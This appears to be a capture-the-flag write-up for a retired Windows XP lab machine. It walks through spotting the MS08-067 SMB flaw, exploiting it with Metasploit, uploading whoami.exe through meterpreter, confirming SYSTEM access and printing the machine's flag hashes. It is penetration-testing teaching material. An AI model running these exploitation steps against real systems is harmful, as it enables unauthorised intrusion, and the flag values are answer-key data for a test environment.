## Initial Scanning  


Let's run our port scanner to identify active TCP services.  

### TCP Port Scan  

Start a long scan:  

```bash
$ cat nmap_full.log                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 04:07 EDT

```  

Right off the bat, we see outdated OS and SMB2, with an SMB OS of Windows XP (Windows 2000 LAN Manager).  

This box is screaming "MS08-067". [Here](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) is a link to more information about this common vulnerability.  


## Initial Access  

To save time, I ran the exploit in msfconsole, easily and quickly gaining initial access to the Windows machine.  

```bash
$ msfconsole
$ search ms08-067

$ shell
```  

Success! The first thing I tried was checking for a hostname and username (with whoami). The hostname returned as LEGACY but "whoami" was not a recognized command.  

To fix this, I remember that Kali has a copy of whoami.exe in /usr/share/windows-binaries/.  

Metasploit made the upload of this file easy with its "upload" command. Since I had ran "shell" after gaining a shell to make it interactive, we first had to exit it with CTRL+Z.  

After hitting CTRL+Z we could upload a file directly to the Windows machine by using the 'upload' meterpreter command.  

```bash
$ upload /usr/share/windows-binaries/whoami.exe
```  

Now, we can re-gain our interactive shell with the "shell" command and all that's left to do is run the executable.  

```bash 
$ shell

C:\WINDOWS\system32>whoami.exe
whoami.exe

NT AUTHORITY\SYSTEM
```  

We are already ROOT! Hooray.  

Let's just grab our flags, at this point.  

### Grabbing Flags  

```bash
cd C:\

C:\>cd "Documents and Settings"


C:\Documents and Settings>dir

 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john


cd Administrator/Desktop

C:\Documents and Settings\Administrator\Desktop>type root.txt

993442d258b0e0ec917cae9e695d5713
```  

Now just to grab the user flag.  

```bash
cd ../../john/Desktop

C:\Documents and Settings\john\Desktop>dir

 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt


C:\Documents and Settings\john\Desktop>type user.txt

e69af0e4f443de7e36876fda4ec7644f
```  

Voila.
